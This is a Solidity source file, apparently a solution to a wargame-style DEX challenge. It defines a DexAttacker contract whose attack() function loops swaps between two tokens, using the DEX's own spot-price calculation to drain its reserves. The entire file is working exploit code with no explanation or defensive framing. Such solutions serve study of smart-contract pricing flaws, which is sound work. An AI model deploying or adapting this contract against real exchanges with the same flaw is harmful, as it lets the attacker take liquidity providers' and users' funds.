// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDex {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function swap(
        address from,
        address to,
        uint256 amount
    ) external;

    function approve(address spender, uint256 amount) external;

    function balanceOf(address token, address account)
        external
        view
        returns (uint256);

    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) external view returns (uint256);
}

contract DexAttacker {
    IDex target;

    constructor(address _targetAddress) {
        target = IDex(_targetAddress);
    }

    function attack() public {
        address t1add = target.token1();
        address t2add = target.token2();
        target.approve(address(target), type(uint256).max);

        uint256 t1bal = target.balanceOf(t1add, address(this));
        uint256 t2bal = target.balanceOf(t2add, address(this));
        uint256 amount;
        uint256 t1lim;
        uint256 t2lim;
        while (t1bal < 100 && t2bal < 100) {
            // Max t1 tokens the dex can afford
            t1lim = target.getSwapPrice(
                t2add,
                t1add,
                target.balanceOf(t2add, address(target))
            );
            amount = t1bal < t1lim ? t1bal : t1lim;
            target.swap(t1add, t2add, amount);
            t2bal = target.balanceOf(t2add, address(this));

            // Max t2 tokens the dex can afford
            t2lim = target.getSwapPrice(
                t1add,
                t2add,
                target.balanceOf(t1add, address(target))
            );
            amount = t2bal < t2lim ? t2bal : t2lim;
            target.swap(t2add, t1add, amount);
            t1bal = target.balanceOf(t1add, address(this));
        }
    }
}
